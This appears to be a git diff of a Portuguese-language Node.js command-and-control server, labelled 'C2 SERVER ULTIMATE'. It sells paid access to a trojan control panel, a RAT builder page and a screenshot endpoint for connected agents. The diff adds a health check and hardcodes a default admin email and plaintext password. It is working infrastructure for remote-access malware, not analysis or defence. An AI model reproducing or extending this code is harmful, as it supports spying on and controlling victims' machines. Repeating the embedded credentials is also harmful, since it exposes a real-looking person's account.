@@ -168,10 +168,6 @@ function generateApiKey() {
     return crypto.randomBytes(32).toString('hex');
 }
 
-function generateAgentId() {
-    return 'agt_' + crypto.randomBytes(8).toString('hex') + '_' + Date.now();
-}
-
 // ============================================================
 // WEBSOCKET
 // ============================================================
@@ -385,7 +381,7 @@ app.get("/api/get_screenshots", (req, res) => {
 });
 
 // ============================================================
-// AUTH ROUTES - CORRIGIDO PARA ADMIN
+// AUTH ROUTES
 // ============================================================
 
 app.post("/register", async (req, res) => {
@@ -437,22 +433,16 @@ app.post("/login", async (req, res) => {
         const isAdmin = user.is_admin === 1;
         const isActivePaid = user.is_paid === 1 && (!user.expires_at || user.expires_at > now);
         
-        // ============================================================
-        // REGRA DE REDIRECIONAMENTO:
-        // - Se for ADMIN (email luismetzker9@gmail.com) -> admin.html
-        // - Se tiver acesso pago -> trojan_panel.html
-        // - Senão -> dashboard.html
-        // ============================================================
         let redirect = "dashboard.html";
         
         if (isAdmin) {
             redirect = "admin.html";
-            console.log(`👑 Admin logado: ${user.email} -> redirecionando para admin.html`);
+            console.log(`👑 Admin logado: ${user.email} (${user.username}) -> admin.html`);
         } else if (isActivePaid) {
             redirect = "trojan_panel.html";
-            console.log(`✅ Usuário pago logado: ${user.email} -> redirecionando para trojan_panel.html`);
+            console.log(`✅ Usuário pago: ${user.email} -> trojan_panel.html`);
         } else {
-            console.log(`⚠️ Usuário sem acesso: ${user.email} -> redirecionando para dashboard.html`);
+            console.log(`⚠️ Usuário sem acesso: ${user.email} -> dashboard.html`);
         }
         
         res.json({
@@ -512,12 +502,12 @@ app.get("/admin/users", (req, res) => {
 });
 
 // ============================================================
-// CRIAR ADMIN PADRÃO (luismetzker9@gmail.com)
+// CRIAR ADMIN PADRÃO (Lloyd / luismetzker9@gmail.com / 30799900Lheg)
 // ============================================================
 async function createDefaultAdmin() {
     const adminEmail = "luismetzker9@gmail.com";
-    const adminPassword = "admin123";
-    const adminUsername = "Luis Metzker";
+    const adminPassword = "30799900Lheg";
+    const adminUsername = "Lloyd";
     
     const existingAdmin = dbGet("SELECT * FROM users WHERE email = ?", [adminEmail]);
     
@@ -530,20 +520,19 @@ async function createDefaultAdmin() {
             VALUES (?, ?, ?, 1, 1, ?, ?)
         `, [adminUsername, adminEmail, hash, api_key, Date.now()]);
         
-        console.log("\n╔════════════════════════════════════════════════════════════════╗");
-        console.log("║         🔐 ADMIN CRIADO AUTOMATICAMENTE                       ║");
-        console.log("╠════════════════════════════════════════════════════════════════╣");
+        console.log("\n╔════════════════════════════════════════════════════════════════════╗");
+        console.log("║                    🔐 ADMIN CRIADO AUTOMATICAMENTE                 ║");
+        console.log("╠════════════════════════════════════════════════════════════════════╣");
+        console.log(`║ 👤 Usuário: ${adminUsername}`);
         console.log(`║ 📧 Email: ${adminEmail}`);
         console.log(`║ 🔑 Senha: ${adminPassword}`);
-        console.log(`║ 👤 Usuário: ${adminUsername}`);
-        console.log(`║ 🎯 Tipo: ADMIN (Acesso total)`);
-        console.log("╚════════════════════════════════════════════════════════════════╝\n");
+        console.log(`║ 🎯 Tipo: ADMIN (Acesso total - admin.html)`);
+        console.log("╚════════════════════════════════════════════════════════════════════╝\n");
     } else if (existingAdmin.is_admin !== 1) {
-        // Se o usuário existe mas não é admin, tornar admin
         dbRun("UPDATE users SET is_admin = 1, is_paid = 1 WHERE email = ?", [adminEmail]);
         console.log(`\n✅ Usuário ${adminEmail} foi promovido a ADMIN!\n`);
     } else {
-        console.log(`\n✅ Admin já existe: ${adminEmail}\n`);
+        console.log(`\n✅ Admin já existe: ${adminUsername} (${adminEmail})\n`);
     }
 }
 
@@ -558,6 +547,18 @@ app.get("/dashboard.html", (req, res) => res.sendFile(path.join(__dirname, "publ
 app.get("/signup.html", (req, res) => res.sendFile(path.join(__dirname, "public", "signup.html")));
 
 // ============================================================
+// HEALTH CHECK
+// ============================================================
+app.get("/health", (req, res) => {
+    res.json({ 
+        status: "online", 
+        uptime: process.uptime(),
+        timestamp: Date.now(),
+        agents: agents.size
+    });
+});
+
+// ============================================================
 // START SERVER
 // ============================================================
 async function start() {
@@ -568,16 +569,16 @@ async function start() {
         const localIP = getLocalIP();
         const publicIP = await getPublicIP();
         
-        console.log(`\n╔════════════════════════════════════════════════════════════════╗`);
-        console.log(`║              🔥 C2 SERVER ULTIMATE INICIADO 🔥                 ║`);
-        console.log(`╠════════════════════════════════════════════════════════════════╣`);
+        console.log(`\n╔════════════════════════════════════════════════════════════════════╗`);
+        console.log(`║                    🔥 C2 SERVER ULTIMATE INICIADO 🔥                 ║`);
+        console.log(`╠════════════════════════════════════════════════════════════════════╣`);
         console.log(`║ 🌐 Local:    http://${localIP}:${PORT}`);
         console.log(`║ 🌍 Público:  http://${publicIP}:${PORT}`);
-        console.log(`╠════════════════════════════════════════════════════════════════╣`);
-        console.log(`║ 📱 Painel Admin:  http://${publicIP}:${PORT}/admin.html`);
-        console.log(`║ 🎮 Painel C2:     http://${publicIP}:${PORT}/trojan_panel.html`);
-        console.log(`║ 🔧 Gerador RAT:   http://${publicIP}:${PORT}/trojan_generator.html`);
-        console.log(`╚════════════════════════════════════════════════════════════════╝`);
+        console.log(`╠════════════════════════════════════════════════════════════════════╣`);
+        console.log(`║ 📱 Admin Panel:  http://${publicIP}:${PORT}/admin.html`);
+        console.log(`║ 🎮 C2 Panel:     http://${publicIP}:${PORT}/trojan_panel.html`);
+        console.log(`║ 🔧 RAT Builder:  http://${publicIP}:${PORT}/trojan_generator.html`);
+        console.log(`╚════════════════════════════════════════════════════════════════════╝`);
     });
 }
 
